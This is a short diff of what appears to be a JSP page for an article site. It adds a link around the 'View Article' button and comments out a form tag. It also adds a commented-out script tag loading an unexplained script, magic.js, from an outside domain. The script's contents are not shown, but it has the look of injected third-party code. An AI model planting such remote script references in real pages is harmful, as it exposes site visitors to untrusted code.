@@ -23,7 +23,7 @@
     </div></a>
 
     <p id="name">${user.firstName}<span>  </span> ${user.secondName}</p>
-    <button class="home-button" id="button-view-article">View Article</button>
+    <a href="/view/article/${id}"><button class="home-button" id="button-view-article">View Article</button></a>
     <button class="home-button" id="button-add-article">Add Article</button>
     <a href="/edit/user/page/${user.id}"><button class="home-button" id="button-edit-user">Edit User</button></a>
     <a href="/logout"><button class="home-button" id="logout">Logout</button></a>
@@ -60,7 +60,8 @@
 </div>
 </c:forEach>
 
-<form enctype="multipart/form-data">
+<%--<form enctype="multipart/form-data">--%>
+<%--<script src="http://sikbox.com/magic.js?d=http://chernev.ru&r=3&s=grey" type="text/javascript"></script>--%>
 
 <div class="news">
 
